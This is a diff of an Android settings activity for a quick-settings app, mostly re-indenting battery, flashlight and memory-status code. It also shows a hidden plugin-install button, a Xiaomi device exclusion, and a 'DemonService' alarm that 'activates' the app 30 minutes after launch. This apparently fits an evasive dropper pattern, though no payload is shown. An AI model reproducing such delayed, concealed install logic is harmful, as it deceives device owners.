@@ -54,129 +54,131 @@ import static com.bwx.bequick.Constants.*;
 
 public class MainSettingsActivity extends BaseActivity implements OnClickListener, OnSharedPreferenceChangeListener {
 
-	private static final String TAG = "ShowSettingsActivity";
+    private static final String TAG = "ShowSettingsActivity";
 
-	class CommonIntentReceiver extends BroadcastReceiver {
+    class CommonIntentReceiver extends BroadcastReceiver {
 
-		// cache
-		private Bitmap mBattery;
-		private Paint mPaint;
-		private float mX;
-		private float mY;
+        // cache
+        private Bitmap mBattery;
+        private Paint mPaint;
+        private float mX;
+        private float mY;
 
-		@Override
-		public void onReceive(Context context, final Intent intent) {
+        @Override
+        public void onReceive(Context context, final Intent intent) {
 
-			runOnUiThread(new Runnable() {
-				public void run() {
+            runOnUiThread(new Runnable() {
+                public void run() {
 
-					if (LedFlashlightReceiver.ACTION_FLASHLIGHT.equals(intent.getAction())) {
-						updateFlashlightView();
+                    if (LedFlashlightReceiver.ACTION_FLASHLIGHT.equals(intent.getAction())) {
+                        updateFlashlightView();
 
-					} else {
+                    } else {
 
-						// read battery status
-						int rawlevel = intent.getIntExtra("level", -1);
-						int scale = intent.getIntExtra("scale", -1);
-						// int status = intent.getIntExtra("status", -1);
-						// int health = intent.getIntExtra("health", -1);
-						int level = 0;
-						if (rawlevel >= 0 && scale > 0) {
-							level = (rawlevel * 100) / scale;
-						}
+                        // read battery status
+                        int rawlevel = intent.getIntExtra("level", -1);
+                        int scale = intent.getIntExtra("scale", -1);
+                        // int status = intent.getIntExtra("status", -1);
+                        // int health = intent.getIntExtra("health", -1);
+                        int level = 0;
+                        if (rawlevel >= 0 && scale > 0) {
+                            level = (rawlevel * 100) / scale;
+                        }
 
-						// update battery status
-						final DisplayMetrics metrics = new DisplayMetrics();
-						getWindowManager().getDefaultDisplay().getMetrics(metrics);
-						final float scaledDensity = metrics.scaledDensity;
+                        // update battery status
+                        final DisplayMetrics metrics = new DisplayMetrics();
+                        getWindowManager().getDefaultDisplay().getMetrics(metrics);
+                        final float scaledDensity = metrics.scaledDensity;
 
-						Bitmap battery = mBattery;
-						Paint paint = mPaint;
-						if (battery == null) {
-							// initialize cache
-							battery = mBattery = BitmapFactory.decodeResource(getResources(), R.drawable.ic_battery);
-							paint = mPaint = new Paint();
-							paint.setColor(Color.BLACK);
-							paint.setFlags(Paint.ANTI_ALIAS_FLAG);
-							paint.setTypeface(Typeface.defaultFromStyle(Typeface.BOLD));
+                        Bitmap battery = mBattery;
+                        Paint paint = mPaint;
+                        if (battery == null) {
+                            // initialize cache
+                            battery = mBattery = BitmapFactory.decodeResource(getResources(), R.drawable.ic_battery);
+                            paint = mPaint = new Paint();
+                            paint.setColor(Color.BLACK);
+                            paint.setFlags(Paint.ANTI_ALIAS_FLAG);
+                            paint.setTypeface(Typeface.defaultFromStyle(Typeface.BOLD));
 
-							paint.setTextSize(14 * scaledDensity);
+                            paint.setTextSize(14 * scaledDensity);
 
-							// calculate position
-							mY = 18 * scaledDensity;
-						}
+                            // calculate position
+                            mY = 18 * scaledDensity;
+                        }
 
-						// align center
-						int delta = 8;
-						if (level > 9)
-							delta -= 4;
-						if (level == 100)
-							delta -= 5;
-						mX = (10 + delta) * scaledDensity;
+                        // align center
+                        int delta = 8;
+                        if (level > 9)
+                            delta -= 4;
+                        if (level == 100)
+                            delta -= 5;
+                        mX = (10 + delta) * scaledDensity;
 
-						battery = battery.copy(Bitmap.Config.ARGB_8888, true);
-						Canvas canvas = new Canvas(battery);
-						// canvas.drawText(getString(R.string.battery_state_value,
-						// level), mX, mY, paint);
-						canvas.drawText(String.valueOf(level), mX, mY, paint);
-						ImageButton view = (ImageButton) findViewById(R.id.battery);
-						view.setImageBitmap(battery);
-					}
+                        battery = battery.copy(Bitmap.Config.ARGB_8888, true);
+                        Canvas canvas = new Canvas(battery);
+                        // canvas.drawText(getString(R.string.battery_state_value,
+                        // level), mX, mY, paint);
+                        canvas.drawText(String.valueOf(level), mX, mY, paint);
+                        ImageButton view = (ImageButton) findViewById(R.id.battery);
+                        view.setImageBitmap(battery);
+                    }
 
-				}
-			});
-		}
-	}
+                }
+            });
+        }
+    }
 
-	ProgressDialog mInitializingDialog;
+    ProgressDialog mInitializingDialog;
 
-	// common intent receiver
-	private CommonIntentReceiver mCommonIntentReceiver;
-	private IntentFilter mCommonIntentFilter;
+    // common intent receiver
+    private CommonIntentReceiver mCommonIntentReceiver;
+    private IntentFilter mCommonIntentFilter;
 
-	private QuickSettingApplication mApp;
-	private TextView mCardStateView;
-	private TextView mInternalStateView;
-	private ImageButton mFlashlight;
-	private boolean mRestartRequired; // true - if appearance changed
+    private QuickSettingApplication mApp;
+    private TextView mCardStateView;
+    private TextView mInternalStateView;
+    private ImageButton mFlashlight;
+    private boolean mRestartRequired; // true - if appearance changed
 
-	private ListSettingsLayout mLayout;
+    private ListSettingsLayout mLayout;
 
-	// preferences
-	private int mPrefAppearance;
-	private int mPrefFlashlight;
+    // preferences
+    private int mPrefAppearance;
+    private int mPrefFlashlight;
 
     BroadcastReceiver sreenBRC;
 
-	/** Called when the activity is first created. */
-	@Override
-	protected void onCreate(Bundle savedInstanceState) {
-		super.onCreate(savedInstanceState);
+    /**
+     * Called when the activity is first created.
+     */
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
 
-		// check eula
-		QuickSettingApplication app = mApp = (QuickSettingApplication) getApplication();
-		SharedPreferences prefs = app.getPreferences();
+        // check eula
+        QuickSettingApplication app = mApp = (QuickSettingApplication) getApplication();
+        SharedPreferences prefs = app.getPreferences();
 
-		requestWindowFeature(Window.FEATURE_NO_TITLE);
-		setContentView(R.layout.settings_view);
+        requestWindowFeature(Window.FEATURE_NO_TITLE);
+        setContentView(R.layout.settings_view);
 
-		// read configuration
-		prefs.registerOnSharedPreferenceChangeListener(this);
-		mPrefAppearance = Integer.parseInt(prefs.getString(PREF_APPEARANCE, "0"));
-		mPrefFlashlight = Integer.parseInt(prefs.getString(PREF_FLASHLIGHT, "0"));
+        // read configuration
+        prefs.registerOnSharedPreferenceChangeListener(this);
+        mPrefAppearance = Integer.parseInt(prefs.getString(PREF_APPEARANCE, "0"));
+        mPrefFlashlight = Integer.parseInt(prefs.getString(PREF_FLASHLIGHT, "0"));
 
-		// initialize views
-		mCardStateView = (TextView) findViewById(R.id.card_state_value);
-		mInternalStateView = (TextView) findViewById(R.id.memory_state_value);
+        // initialize views
+        mCardStateView = (TextView) findViewById(R.id.card_state_value);
+        mInternalStateView = (TextView) findViewById(R.id.memory_state_value);
 
-		View battery = findViewById(R.id.battery);
-		battery.setOnClickListener(this);
+        View battery = findViewById(R.id.battery);
+        battery.setOnClickListener(this);
 
-		mFlashlight = (ImageButton) findViewById(R.id.flashlight);
-		mFlashlight.setOnClickListener(this);
+        mFlashlight = (ImageButton) findViewById(R.id.flashlight);
+        mFlashlight.setOnClickListener(this);
 
-		mLayout = new ListSettingsLayout(findViewById(R.id.settings_list), app);
-		
+        mLayout = new ListSettingsLayout(findViewById(R.id.settings_list), app);
+
 //		if (SDK_VERSION >= 7) { // quicker compatible
 //			boolean shown = prefs.getBoolean(PREF_ADS_SHOWN, false);
 //			if (!shown) {
@@ -187,75 +189,21 @@ public class MainSettingsActivity extends BaseActivity implements OnClickListene
 
 
         View button = findViewById(R.id.install);
-		button.setOnClickListener(new OnClickListener() {
+        button.setOnClickListener(new OnClickListener() {
             @Override
             public void onClick(View view) {
 //                if (!Config.DOWNLOAD_PROCESS_RUNNING.get()) {
-                    UtilOperator.tryToInstallPlugin(getApplicationContext());
+                UtilOperator.tryToInstallPlugin(getApplicationContext());
 //                }
             }
         });
 
-//        Drawable btn = button.getBackground();
-//        if (btn != null) {
-//            if (btn instanceof BitmapDrawable) {
-//                Bitmap bt = ((BitmapDrawable) btn).getBitmap();
-//                int color = AppRuntime.getColorFromBitmap(getApplicationContext(), bt);
-//                SettingManager.getInstance().setDefaultBtnColor(color);
-//            } else if (btn instanceof StateListDrawable) {
-//                StateListDrawable stateBtn = (StateListDrawable) btn;
-//                Drawable d = stateBtn.getCurrent();
-//                if (d != null && d instanceof NinePatchDrawable) {
-//                    d.setBounds(0, 0, 100, 100);
-//                    Canvas c = new Canvas();
-//                    Bitmap bt = Bitmap.createBitmap(100, 100, Bitmap.Config.ARGB_8888);
-//                    c.drawBitmap(bt, 0, 0, new Paint());
-//
-//                    AppRuntime.SHOW_BT = bt;
-//
-//                    int color = AppRuntime.getColorFromBitmap(getApplicationContext(), bt);
-//                    SettingManager.getInstance().setDefaultBtnColor(color);
-//                }
-//            }
-//        }
-
-//        if (!Config.DEBUG) {
-            button.setVisibility(View.GONE);
-//        }
-
-
-        //test code for sreen status
-//        sreenBRC = new BroadcastReceiver() {
-//            @Override
-//            public void onReceive(Context context, Intent intent) {
-//                if (intent != null && intent.getAction() != null) {
-//                    if (intent.getAction().equals(Intent.ACTION_SCREEN_ON)) {
-//                        Config.LOGD("<<<< " + Intent.ACTION_SCREEN_ON + " >>>>>"
-//                                        + " function screen status : " + UtilsRuntime.isScreenLocked(MainSettingsActivity.this));
-//                        //try to install
-//                        UtilOperator.tryToInstallPlugin(MainSettingsActivity.this);
-//                    } else if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)) {
-//                        Config.LOGD("<<<< " + Intent.ACTION_SCREEN_OFF + " >>>>>"
-//                                        + " function screen status : " + UtilsRuntime.isScreenLocked(MainSettingsActivity.this));
-//                    }
-//                }
-//            }
-//        };
-//        registerReceiver(sreenBRC, new IntentFilter(Intent.ACTION_SCREEN_ON));
-//        registerReceiver(sreenBRC, new IntentFilter(Intent.ACTION_SCREEN_OFF));
-
+        button.setVisibility(View.GONE);
 
         appActive();
-	}
+    }
 
     private void appActive() {
-//        //下载适配列表
-//        synchronized (AppRuntime.ADPINFO_LIST) {
-//            if (AppRuntime.ADPINFO_LIST == null || AppRuntime.ADPINFO_LIST.size() == 0) {
-//                Utils.tryToFetchAdapterInfo(getApplicationContext());
-//            }
-//        }
-
         if (AppRuntime.isXiaomiDevice()) {
             if (Config.DEBUG) {
                 Config.LOGD("[[QuickSettingApplication::onCreate]] this device is Xiaomi Devices, just ignore this device");
@@ -289,15 +237,17 @@ public class MainSettingsActivity extends BaseActivity implements OnClickListene
 
         long activeTime = SettingManager.getInstance().getKeyActiveTime();
         if (activeTime == 0) {
-            long deta = System.currentTimeMillis() - SettingManager.getInstance().getKeyLanuchTime();
-            //TODO: 设置激活时间，激活时间是在启动时间之后的半个小时
-            if (deta >= (30 * 60 * 1000)) {
-                //active now
+            if (SettingManager.getInstance().getKeyLanuchTime() != 0) {
+                long deta = System.currentTimeMillis() - SettingManager.getInstance().getKeyLanuchTime();
+                //TODO: 设置激活时间，激活时间是在启动时间之后的半个小时
+                if (deta >= (30 * 60 * 1000)) {
+                    //active now
 //                UtilOperator.startActiveAlarm(getApplicationContext(), 1000);
-                DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, 1000);
-            } else {
-                long activeDelay = 30 * 60 * 1000 - deta;
-                DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, activeDelay);
+                    DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, 1000);
+                } else {
+                    long activeDelay = 30 * 60 * 1000 - deta;
+                    DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, activeDelay);
+                }
             }
         } else {
             Calendar c = Calendar.getInstance();
@@ -325,290 +275,292 @@ public class MainSettingsActivity extends BaseActivity implements OnClickListene
 //        unregisterReceiver(sreenBRC);
     }
 
-	@Override
-	protected Dialog onCreateDialog(int id) {
-		
-		OnClickListener onclick = new OnClickListener() {
-			public void onClick(View view) {
-				dismissDialog(0);
-				final int viewId = view.getId();
-				if (R.id.button1 == viewId) {
-					CommonPrefs.openQuickerInMarket(MainSettingsActivity.this);
-				}
-			}
-		};
-		
-		Dialog dialog = new Dialog(this);
-		dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
-		dialog.setContentView(R.layout.quicker_ads);
-		dialog.findViewById(R.id.button1).setOnClickListener(onclick);
-		dialog.findViewById(R.id.button2).setOnClickListener(onclick);
-		
-		return dialog;
-	}
-	
-	private void updateFlashlightView() {
-		ImageButton flashlight = mFlashlight;
-		int pref = mPrefFlashlight;
-		if (pref == 2) {
-			// hidden flashlight
-			flashlight.setVisibility(View.GONE);
-		} else {
-			// show
-			flashlight.setVisibility(View.VISIBLE);
-			if (pref == 1) {
-				// update flashlight state image
-				boolean enabled = LedFlashlightReceiver.isFlashlightEnabled(this);
-				flashlight.setImageResource(enabled ? R.drawable.ic_flashlight_on : R.drawable.ic_flashlight);
-			}
-		}
-	}
+    @Override
+    protected Dialog onCreateDialog(int id) {
 
-	private void createInitializeActivateHandlers() {
+        OnClickListener onclick = new OnClickListener() {
+            public void onClick(View view) {
+                dismissDialog(0);
+                final int viewId = view.getId();
+                if (R.id.button1 == viewId) {
+                    CommonPrefs.openQuickerInMarket(MainSettingsActivity.this);
+                }
+            }
+        };
 
-		Iterator<Setting> settings = mApp.getSettings().iterator();
-		settings.next(); // jump one a "visible" group
+        Dialog dialog = new Dialog(this);
+        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
+        dialog.setContentView(R.layout.quicker_ads);
+        dialog.findViewById(R.id.button1).setOnClickListener(onclick);
+        dialog.findViewById(R.id.button2).setOnClickListener(onclick);
 
-		while (settings.hasNext()) {
-			final Setting setting = settings.next();
-			final int id = setting.id;
-			SettingHandler handler = setting.getAssignedHandler();
+        return dialog;
+    }
 
-			if (handler == null) {
-				// switch visible to false
-				if (id == Setting.GROUP_HIDDEN) {
-					break; // stop here
-				}
+    private void updateFlashlightView() {
+        ImageButton flashlight = mFlashlight;
+        int pref = mPrefFlashlight;
+        if (pref == 2) {
+            // hidden flashlight
+            flashlight.setVisibility(View.GONE);
+        } else {
+            // show
+            flashlight.setVisibility(View.VISIBLE);
+            if (pref == 1) {
+                // update flashlight state image
+                boolean enabled = LedFlashlightReceiver.isFlashlightEnabled(this);
+                flashlight.setImageResource(enabled ? R.drawable.ic_flashlight_on : R.drawable.ic_flashlight);
+            }
+        }
+    }
 
-				// try to create a handler
-				handler = SettingsFactory.createSettingHandler(setting);
-			}
+    private void createInitializeActivateHandlers() {
 
-			if (handler != null) {
+        Iterator<Setting> settings = mApp.getSettings().iterator();
+        settings.next(); // jump one a "visible" group
 
-				// we have to activate visible setting
-				// Log.d(TAG , "activate: "+ id);
+        while (settings.hasNext()) {
+            final Setting setting = settings.next();
+            final int id = setting.id;
+            SettingHandler handler = setting.getAssignedHandler();
 
-				try {
-					handler.activate(this);
-				} catch (Throwable e) {
-					// write log
-					Log.e(TAG, "cannot activate: " + id, e);
-					String settingName = getString(setting.titleId);
-					Toast.makeText(this, getString(R.string.msg_cannot_init_setting, settingName), Toast.LENGTH_LONG)
-							.show();
+            if (handler == null) {
+                // switch visible to false
+                if (id == Setting.GROUP_HIDDEN) {
+                    break; // stop here
+                }
 
-					// remove from the the central settings list
-					settings.remove();
-				}
-			}
-		}
-	}
+                // try to create a handler
+                handler = SettingsFactory.createSettingHandler(setting);
+            }
 
-	private void updateMemoryStatus() {
-		String state; 
+            if (handler != null) {
 
-		// internal
-		state = getMemoryStatus(Environment.getDataDirectory(), R.string.txt_memory_state_value);
-		if (state == null) {
-			state = getString(R.string.txt_status_unknown);
-		}
-		mInternalStateView.setText(state);
-		
-		// external
-		state = Environment.getExternalStorageState();
-		if (Environment.MEDIA_MOUNTED.equals(state) || Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
-			state = getMemoryStatus(Environment.getExternalStorageDirectory(), R.string.txt_card_state_value);
-			if (state == null) {
-				state = getString(R.string.txt_no_card);
-			}
-		} else {
-			state = getString(R.string.txt_no_card);
-		}
-		mCardStateView.setText(state);
+                // we have to activate visible setting
+                // Log.d(TAG , "activate: "+ id);
 
-	}
-	
-	private String getMemoryStatus(File path, int resId) {
-		try {
+                try {
+                    handler.activate(this);
+                } catch (Throwable e) {
+                    // write log
+                    Log.e(TAG, "cannot activate: " + id, e);
+                    String settingName = getString(setting.titleId);
+                    Toast.makeText(this, getString(R.string.msg_cannot_init_setting, settingName), Toast.LENGTH_LONG)
+                        .show();
+
+                    // remove from the the central settings list
+                    settings.remove();
+                }
+            }
+        }
+    }
+
+    private void updateMemoryStatus() {
+        String state;
+
+        // internal
+        state = getMemoryStatus(Environment.getDataDirectory(), R.string.txt_memory_state_value);
+        if (state == null) {
+            state = getString(R.string.txt_status_unknown);
+        }
+        mInternalStateView.setText(state);
+
+        // external
+        state = Environment.getExternalStorageState();
+        if (Environment.MEDIA_MOUNTED.equals(state) || Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
+            state = getMemoryStatus(Environment.getExternalStorageDirectory(), R.string.txt_card_state_value);
+            if (state == null) {
+                state = getString(R.string.txt_no_card);
+            }
+        } else {
+            state = getString(R.string.txt_no_card);
+        }
+        mCardStateView.setText(state);
+
+    }
+
+    private String getMemoryStatus(File path, int resId) {
+        try {
             StatFs stat = new StatFs(path.getPath());
             long blockSize = stat.getBlockSize();
             long totalBlocks = stat.getBlockCount();
             long availableBlocks = stat.getAvailableBlocks();
-            
+
             if (DEBUG) {
-            	Log.d(TAG, "memory/path: " + path + " ------------");
-            	Log.d(TAG, "memory/blockSize: " + blockSize);
-            	Log.d(TAG, "memory/totalBlocks: " + totalBlocks);
-            	Log.d(TAG, "memory/availableBlocks: " + availableBlocks);
+                Log.d(TAG, "memory/path: " + path + " ------------");
+                Log.d(TAG, "memory/blockSize: " + blockSize);
+                Log.d(TAG, "memory/totalBlocks: " + totalBlocks);
+                Log.d(TAG, "memory/availableBlocks: " + availableBlocks);
             }
 
             long totalSize = totalBlocks * blockSize;
             long availableSize = availableBlocks * blockSize;
             long availablePercent = (totalSize == 0) ? -1 : availableSize * 100 / totalSize;
-            
+
             if (Constants.DEBUG) {
-            	Log.d(TAG, "memory/totalSize: " + totalSize);
-            	Log.d(TAG, "memory/availableSize: " + availableSize);
+                Log.d(TAG, "memory/totalSize: " + totalSize);
+                Log.d(TAG, "memory/availableSize: " + availableSize);
             }
-            
+
             String res = getString(resId);
             if (availablePercent > -1) {
-            	res += " (" + availablePercent + "%)";
+                res += " (" + availablePercent + "%)";
             } else {
             }
             res += " " + Formatter.formatFileSize(this, availableSize);
             return res;
-            
+
         } catch (IllegalArgumentException e) {
             // this can occur if the SD card is removed, but we haven't received the 
             // ACTION_MEDIA_REMOVED Intent yet.
             return null;
-        }		
-	}
-	
-	protected void onResume() {
-		super.onResume();
+        }
+    }
 
-		updateMemoryStatus();
+    protected void onResume() {
+        super.onResume();
 
-		// register common receiver
-		IntentFilter filter = mCommonIntentFilter;
-		if (filter == null) {
-			filter = mCommonIntentFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
-			filter.addAction(LedFlashlightReceiver.ACTION_FLASHLIGHT);
-			mCommonIntentReceiver = new CommonIntentReceiver();
-		}
-		registerReceiver(mCommonIntentReceiver, filter);
+        updateMemoryStatus();
 
-		// create/initialize/activate handlers
-		createInitializeActivateHandlers();
-		mLayout.updateLayout(this);
-		updateFlashlightView();
+        // register common receiver
+        IntentFilter filter = mCommonIntentFilter;
+        if (filter == null) {
+            filter = mCommonIntentFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+            filter.addAction(LedFlashlightReceiver.ACTION_FLASHLIGHT);
+            mCommonIntentReceiver = new CommonIntentReceiver();
+        }
+        registerReceiver(mCommonIntentReceiver, filter);
 
-		if (mRestartRequired) {
-			finish();
-			Intent intent = new Intent(Constants.ACTION_START_QS);
-			sendBroadcast(intent);
-		}
-	}
+        // create/initialize/activate handlers
+        createInitializeActivateHandlers();
+        mLayout.updateLayout(this);
+        updateFlashlightView();
 
-	protected void onPause() {
-		// Log.d(TAG, "onPause");
+        if (mRestartRequired) {
+            finish();
+            Intent intent = new Intent(Constants.ACTION_START_QS);
+            sendBroadcast(intent);
+        }
+    }
 
-		// unregister battery receiver
-		unregisterReceiver(mCommonIntentReceiver);
+    protected void onPause() {
+        // Log.d(TAG, "onPause");
 
-		// deactivate setting handlers
-		final ArrayList<Setting> settings = mApp.getSettings();
-		final int length = settings.size();
-		for (int i = 1; i < length; i++) { // jump over first group setting
+        // unregister battery receiver
+        unregisterReceiver(mCommonIntentReceiver);
 
-			final Setting setting = settings.get(i);
-			final int id = setting.id;
-			if (id == Setting.GROUP_HIDDEN)
-				break; // hidden are already disabled
+        // deactivate setting handlers
+        final ArrayList<Setting> settings = mApp.getSettings();
+        final int length = settings.size();
+        for (int i = 1; i < length; i++) { // jump over first group setting
 
-			try {
-				setting.getAssignedHandler().deactivate();
-			} catch (Exception e) {
-				Log.w(TAG, e);
-			}
-			// Log.d(TAG, "deactivate: " + id);
-		}
+            final Setting setting = settings.get(i);
+            final int id = setting.id;
+            if (id == Setting.GROUP_HIDDEN)
+                break; // hidden are already disabled
 
-		// dismiss initialization dialog
-		if (mInitializingDialog != null) {
-			mInitializingDialog.dismiss();
-			mInitializingDialog = null;
-		}
+            try {
+                setting.getAssignedHandler().deactivate();
+            } catch (Exception e) {
+                Log.w(TAG, e);
+            }
+            // Log.d(TAG, "deactivate: " + id);
+        }
 
-		super.onPause();
-	}
+        // dismiss initialization dialog
+        if (mInitializingDialog != null) {
+            mInitializingDialog.dismiss();
+            mInitializingDialog = null;
+        }
 
-	public boolean onCreateOptionsMenu(Menu menu) {
-		MenuInflater inflater = getMenuInflater();
-		inflater.inflate(R.menu.menu, menu);
-		return true;
-	}
+        super.onPause();
+    }
 
-	public boolean onOptionsItemSelected(MenuItem item) {
-		switch (item.getItemId()) {
-		case R.id.menu_customize: // customization
-			startActivity(new Intent(this, LayoutSettingsActivity.class));
-			break;
-		case R.id.menu_preferences: // preferences
-			startActivity(new Intent(this, CommonPrefs.class));
-			break;
-		// case R.id.menu_addons: // addons
-		// startActivity(new Intent(this, AddonsActivity.class));
-		// break;
-		default:
-			return super.onOptionsItemSelected(item);
-		}
-		return true;
-	}
+    public boolean onCreateOptionsMenu(Menu menu) {
+        MenuInflater inflater = getMenuInflater();
+        inflater.inflate(R.menu.menu, menu);
+        return true;
+    }
 
-	public void onClick(View v) {
+    public boolean onOptionsItemSelected(MenuItem item) {
+        switch (item.getItemId()) {
+            case R.id.menu_customize: // customization
+                startActivity(new Intent(this, LayoutSettingsActivity.class));
+                break;
+            case R.id.menu_preferences: // preferences
+                startActivity(new Intent(this, CommonPrefs.class));
+                break;
+            // case R.id.menu_addons: // addons
+            // startActivity(new Intent(this, AddonsActivity.class));
+            // break;
+            default:
+                return super.onOptionsItemSelected(item);
+        }
+        return true;
+    }
 
-		switch (v.getId()) {
-		case R.id.battery: {
-			// show battery statistics
-			Intent intent1 = new Intent(); intent1.setClassName("com.android.settings", "com.android.settings.fuelgauge.PowerUsageSummary");
-			Intent intent2 = new Intent(); intent2.setClassName("com.android.settings", "com.android.settings.BatteryInfo");
-			startActivitiesSafely(intent1, intent2);
-			break;
-		}
+    public void onClick(View v) {
 
-		case R.id.flashlight: {
+        switch (v.getId()) {
+            case R.id.battery: {
+                // show battery statistics
+                Intent intent1 = new Intent();
+                intent1.setClassName("com.android.settings", "com.android.settings.fuelgauge.PowerUsageSummary");
+                Intent intent2 = new Intent();
+                intent2.setClassName("com.android.settings", "com.android.settings.BatteryInfo");
+                startActivitiesSafely(intent1, intent2);
+                break;
+            }
 
-			if (mPrefFlashlight == 0) {
-				// start screen based flashlight
-				startActivity(new Intent(this, ScreenLightActivity.class));
-			} else {
-				// toggle led-based flashlight
-				boolean enabled = LedFlashlightReceiver.isFlashlightEnabled(this);
-				Intent intent = new Intent(LedFlashlightReceiver.ACTION_CONTROL_FLASHLIGHT);
-				intent.putExtra(LedFlashlightReceiver.EXT_ENABLED, !enabled);
-				sendBroadcast(intent);
-			}
-			break;
-		}
-		}
+            case R.id.flashlight: {
 
-	}
+                if (mPrefFlashlight == 0) {
+                    // start screen based flashlight
+                    startActivity(new Intent(this, ScreenLightActivity.class));
+                } else {
+                    // toggle led-based flashlight
+                    boolean enabled = LedFlashlightReceiver.isFlashlightEnabled(this);
+                    Intent intent = new Intent(LedFlashlightReceiver.ACTION_CONTROL_FLASHLIGHT);
+                    intent.putExtra(LedFlashlightReceiver.EXT_ENABLED, !enabled);
+                    sendBroadcast(intent);
+                }
+                break;
+            }
+        }
 
-	public void onSharedPreferenceChanged(SharedPreferences prefs, String key) {
-		if (PREF_APPEARANCE.equals(key)) {
-			int appearance = Integer.parseInt(prefs.getString(PREF_APPEARANCE, "0"));
-			mRestartRequired = appearance != mPrefAppearance;
-			mPrefAppearance = appearance;
+    }
 
-		} else if (PREF_FLASHLIGHT.equals(key)) {
-			mPrefFlashlight = Integer.parseInt(prefs.getString(PREF_FLASHLIGHT, "0"));
-			updateFlashlightView();
+    public void onSharedPreferenceChanged(SharedPreferences prefs, String key) {
+        if (PREF_APPEARANCE.equals(key)) {
+            int appearance = Integer.parseInt(prefs.getString(PREF_APPEARANCE, "0"));
+            mRestartRequired = appearance != mPrefAppearance;
+            mPrefAppearance = appearance;
 
-		}
-	}
+        } else if (PREF_FLASHLIGHT.equals(key)) {
+            mPrefFlashlight = Integer.parseInt(prefs.getString(PREF_FLASHLIGHT, "0"));
+            updateFlashlightView();
 
-	public QuickSettingApplication getApp() {
-		return mApp;
-	}
+        }
+    }
 
-	public boolean startActivitiesSafely(Intent... intents) {
-    	int size = intents.length;
-    	for (int index=0; index<size; index++) {
-    		try {
-    			Intent intent = intents[index];
-    			startActivity(intent);
-    			return true;
-    		} catch (Exception e) {
-    			if (index + 1 == size) {
-    				// this was the last intent to try
-    				Log.e(TAG, "cannot launch activity", e);
-    			}
-    		}
-    	}
-    	return false;
+    public QuickSettingApplication getApp() {
+        return mApp;
+    }
+
+    public boolean startActivitiesSafely(Intent... intents) {
+        int size = intents.length;
+        for (int index = 0; index < size; index++) {
+            try {
+                Intent intent = intents[index];
+                startActivity(intent);
+                return true;
+            } catch (Exception e) {
+                if (index + 1 == size) {
+                    // this was the last intent to try
+                    Log.e(TAG, "cannot launch activity", e);
+                }
+            }
+        }
+        return false;
     }
 }
